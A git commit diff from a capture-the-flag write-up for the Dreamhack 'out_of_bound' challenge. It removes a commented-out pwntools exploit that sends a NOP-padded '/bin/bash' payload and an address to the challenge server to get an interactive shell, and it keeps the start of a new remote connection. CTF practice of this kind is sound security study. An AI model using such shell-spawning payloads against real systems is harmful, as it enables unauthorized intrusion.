1c29e0b0051cd60338590c293e64a585f626f66a
NULLNULLpersid <persid@cu.ac.kr>
2024-08-17 05:06:04 +0900

    완료

--- System/LEVEL1/out_of_bound/Write-up/out_of_bound.py
+++ System/LEVEL1/out_of_bound/Write-up/out_of_bound.py
@@ -1,15 +1,3 @@
-'''
-from pwn import *
-
-payload = b'\x90'*4 + b'\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x00' + b'\xac\x0a\x4a\x80'
-
-r = remote('host3.dreamhack.games', 13223)
-
-r.send(payload)
-r.send(b'21')
-
-r.interactive()
-'''
 from pwn import *
 
 p = remote("host3.dreamhack.games", 13223)
